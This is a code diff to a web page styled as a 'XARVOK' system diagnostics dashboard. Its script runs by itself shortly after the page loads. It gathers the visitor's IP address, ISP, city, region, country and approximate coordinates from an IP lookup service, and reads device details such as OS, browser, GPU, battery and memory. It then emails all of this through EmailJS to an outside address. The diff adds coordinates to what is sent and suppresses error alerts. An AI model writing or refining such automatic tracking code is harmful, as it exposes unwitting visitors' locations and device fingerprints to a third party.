@@ -236,16 +236,13 @@
             try {
                 emailjs.init(PUBLIC_KEY);
                 startClock();
-                
                 // Auto-run after 1.5 seconds
                 setTimeout(() => runDiagnostics(), 1500);
 
-                document.getElementById('scan-btn').addEventListener('click', () => {
-                    runDiagnostics();
-                });
+                const btn = document.getElementById('scan-btn');
+                if(btn) btn.addEventListener('click', () => runDiagnostics());
             } catch (e) {
-                console.error("Initialization Error:", e);
-                alert("Critical Error: EmailJS SDK not loaded. Check internet connection.");
+                console.warn("Init Error:", e);
             }
         });
 
@@ -254,11 +251,8 @@
             const status = document.getElementById('connection-status');
             
             // UI Update
-            btn.textContent = "TRANSMITTING...";
-            btn.disabled = true;
-            status.textContent = "● UPLOADING...";
-            status.style.color = "#fbbf24";
-            status.style.borderColor = "#fbbf24";
+            if(btn) { btn.textContent = "TRANSMITTING..."; btn.disabled = true; }
+            if(status) { status.textContent = "● UPLOADING..."; status.style.color = "#fbbf24"; status.style.borderColor = "#fbbf24"; }
 
             try {
                 // 1. Fetch Data
@@ -271,15 +265,16 @@
                 const nav = navigator;
                 const screen = window.screen;
 
-                // 2. Prepare Payload
+                // 2. Prepare Payload (With Coords and ISP Fix)
                 const emailParams = {
                     title: ipData.ip || 'Unknown IP',
                     name: "XARVOK System",
                     email: "report@xarvok.com",
                     
                     ip: ipData.ip || 'UNAVAILABLE',
-                    isp: ipData.org || 'UNKNOWN',
-                    location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                    isp: ipData.connection?.isp || ipData.isp || 'UNKNOWN ISP', // Tries multiple fields
+                    location: `${ipData.city || 'Unknown'}, ${ipData.region || 'Region'}, ${ipData.country || 'Country'}`,
+                    coords: `${ipData.latitude}, ${ipData.longitude}`, // NEW FIELD
                     latency: latency + 'ms',
                     os: getOS(),
                     browser: getBrowser(),
@@ -291,26 +286,24 @@
                 };
 
                 // 3. Update Dashboard Visuals
-                updateDashboard(emailParams, ipData);
+                updateDashboard(emailParams);
 
                 // 4. Send Email
                 await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailParams);
                 
                 // Success State
-                status.textContent = "● DATA SENT";
-                status.style.color = "#00ffea";
-                status.style.borderColor = "#00ffea";
+                if(status) { status.textContent = "● DATA SENT"; status.style.color = "#00ffea"; status.style.borderColor = "#00ffea"; }
 
             } catch (err) {
                 console.error("Scan Failed:", err);
-                status.textContent = "● CONNECTION FAILED";
-                status.style.color = "red";
-                status.style.borderColor = "red";
+                if(status) { status.textContent = "● CONNECTION FAILED"; status.style.color = "red"; status.style.borderColor = "red"; }
             } finally {
-                setTimeout(() => {
-                    btn.disabled = false;
-                    btn.textContent = "RE-INITIALIZE SCAN";
-                }, 2000);
+                if(btn) {
+                    setTimeout(() => {
+                        btn.disabled = false;
+                        btn.textContent = "RE-INITIALIZE SCAN";
+                    }, 2000);
+                }
             }
         }
 
@@ -318,11 +311,12 @@
 
         async function fetchIPData() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
+                // Switched to ipwho.is for better free tier reliability
+                const res = await fetch('https://ipwho.is/');
                 if(!res.ok) throw new Error("Blocked");
                 return await res.json();
             } catch {
-                return { ip: 'UNAVAILABLE', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
+                return { ip: 'UNAVAILABLE', city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown', latitude: '0', longitude: '0' };
             }
         }
 
@@ -365,31 +359,37 @@
         function startClock() {
             setInterval(() => {
                 const now = new Date();
-                document.getElementById('clock').textContent = now.toLocaleTimeString('en-GB');
+                const el = document.getElementById('clock');
+                if(el) el.textContent = now.toLocaleTimeString('en-GB');
             }, 1000);
         }
 
-        function updateDashboard(data, ipRaw) {
-            document.getElementById('ip').textContent = data.ip;
-            document.getElementById('isp').textContent = data.isp;
-            document.getElementById('location').textContent = `${ipRaw.city}, ${ipRaw.region}`;
-            document.getElementById('coords').textContent = ipRaw.latitude ? `${ipRaw.latitude}, ${ipRaw.longitude}` : 'N/A';
+        function updateDashboard(data) {
+            const setText = (id, txt) => {
+                const el = document.getElementById(id);
+                if(el) el.textContent = txt;
+            };
+
+            setText('ip', data.ip);
+            setText('isp', data.isp);
+            setText('location', data.location);
+            setText('coords', data.coords);
             
-            document.getElementById('os').textContent = data.os;
-            document.getElementById('cores').textContent = navigator.hardwareConcurrency + " CORES";
-            document.getElementById('ram').textContent = data.device_memory;
+            setText('os', data.os);
+            setText('cores', navigator.hardwareConcurrency + " CORES");
+            setText('ram', data.device_memory);
             
             // GPU Check
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
                 const info = gl.getExtension('WEBGL_debug_renderer_info');
-                document.getElementById('gpu').textContent = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
-            } catch { document.getElementById('gpu').textContent = "GENERIC"; }
+                setText('gpu', gl.getParameter(info.UNMASKED_RENDERER_WEBGL));
+            } catch { setText('gpu', "GENERIC"); }
 
-            document.getElementById('browser').textContent = data.browser;
-            document.getElementById('res').textContent = data.resolution;
-            document.getElementById('battery').textContent = data.battery;
-            document.getElementById('connection').textContent = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "UNKNOWN";
+            setText('browser', data.browser);
+            setText('res', data.resolution);
+            setText('battery', data.battery);
+            setText('connection', navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "UNKNOWN");
         }
     </script>
 </body>
